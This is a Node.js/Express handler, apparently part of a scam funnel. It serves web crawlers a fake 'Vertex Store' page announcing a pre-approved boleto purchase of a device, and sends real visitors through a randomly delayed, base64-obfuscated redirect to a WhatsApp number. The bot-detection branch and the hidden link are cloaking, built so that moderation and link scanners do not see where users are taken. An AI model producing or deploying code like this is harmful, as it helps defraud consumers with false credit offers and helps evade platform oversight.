const { isBot } = require("../ServicesApiOficial/utils/isBot");

const NUMERO_DESTINO = "5522999145893";
const MENSAGEM = encodeURIComponent("Olá! Quero saber mais sobre aprovação do boleto");
const WHATSAPP_LINK = `https://wa.me/${NUMERO_DESTINO}?text=${MENSAGEM}`;

// 🔐 Ofuscar com base64
const LINK_BASE64 = Buffer.from(WHATSAPP_LINK).toString("base64");

const redirecionarParaWhatsApp = (req, res) => {
  const userAgent = req.headers["user-agent"] || "";

  if (isBot(userAgent)) {
    return res.status(200).send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Pré-aprovação no Boleto - Vertex Store</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      color: #222;
      text-align: center;
      padding: 40px;
    }
    .container {
      max-width: 600px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #1e88e5;
    }
    .destaque {
      color: #388e3c;
      font-weight: bold;
      font-size: 22px;
      margin-top: 20px;
    }
    .info {
      margin-top: 15px;
      font-size: 16px;
    }
    .footer {
      margin-top: 40px;
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Vertex Store</h1>
    <p class="destaque">📢 Ei, boa notícia!</p>
    <p class="info">Finalizamos sua análise e identificamos que seu perfil foi <strong>pré-aprovado</strong> para continuar com o processo via boleto.</p>
    <p class="info">A opção de seguir com a solicitação do aparelho já está liberada.</p>
    <p class="info">Se preferir, você pode entrar em contato com a nossa equipe para saber os próximos passos ou tirar dúvidas. 💜</p>
    <div class="footer">© 2025 Vertex Store — Esta mensagem foi enviada com base em uma solicitação anterior de atendimento.</div>
  </div>
</body>
</html>`);
  }

  // 🚫 Nada de comentário com link visível
  return res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <script>
    setTimeout(function() {
      window.location.href = atob("${LINK_BASE64}");
    }, Math.floor(300 + Math.random() * 700));
  </script>
</head>
<body>
  <p>seguindo para aprovação...</p>
</body>
</html>`);
};

module.exports = { redirecionarParaWhatsApp };
